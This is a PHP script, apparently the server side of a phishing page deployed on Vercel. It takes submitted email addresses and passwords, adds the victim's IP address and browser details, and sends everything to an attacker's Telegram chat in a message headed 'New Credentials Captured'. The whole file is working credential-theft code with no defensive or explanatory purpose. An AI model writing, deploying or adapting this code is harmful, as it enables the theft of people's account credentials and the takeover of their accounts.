<?php
// tele.php - Using Vercel environment variables

// Enable CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header("Content-Type: application/json");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// Get environment variables (set in Vercel dashboard)
$botToken = getenv('BOT_TOKEN');
$chatId = getenv('CHAT_ID');

// Fallback for local development (optional - remove for production)
if (!$botToken || !$chatId) {
    // For local testing only - don't commit real tokens
    $botToken = getenv('BOT_TOKEN_LOCAL') ?: '';
    $chatId = getenv('CHAT_ID_LOCAL') ?: '';
}

// Check if tokens are configured
if (empty($botToken) || empty($chatId)) {
    http_response_code(500);
    echo json_encode(['error' => 'Telegram configuration missing']);
    error_log('BOT_TOKEN or CHAT_ID not set in environment');
    exit();
}

// Get POST data
$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    $input = $_POST;
}

$email = isset($input['email']) ? trim($input['email']) : '';
$password = isset($input['password']) ? trim($input['password']) : '';
$ip = isset($input['ip']) ? $input['ip'] : ($_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown');
$userAgent = isset($input['userAgent']) ? $input['userAgent'] : ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');
$timestamp = isset($input['timestamp']) ? $input['timestamp'] : date('Y-m-d H:i:s');

// Validate
if (empty($email) || empty($password)) {
    http_response_code(400);
    echo json_encode(['error' => 'Email and password are required']);
    exit();
}

// Build message
$message = "🔐 New Credentials Captured 🔐\n\n";
$message .= "📧 Email: " . $email . "\n";
$message .= "🔑 Password: " . $password . "\n";
$message .= "🌐 IP: " . $ip . "\n";
$message .= "⏰ Time: " . $timestamp . "\n";
$message .= "🖥️ Browser: " . $userAgent . "\n\n";
$message .= "#Credentials #Capture";

// Send to Telegram
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode == 200) {
    echo json_encode(['success' => true, 'message' => 'Sent to Telegram']);
} else {
    http_response_code(500);
    echo json_encode(['error' => 'Failed to send to Telegram']);
}
?>
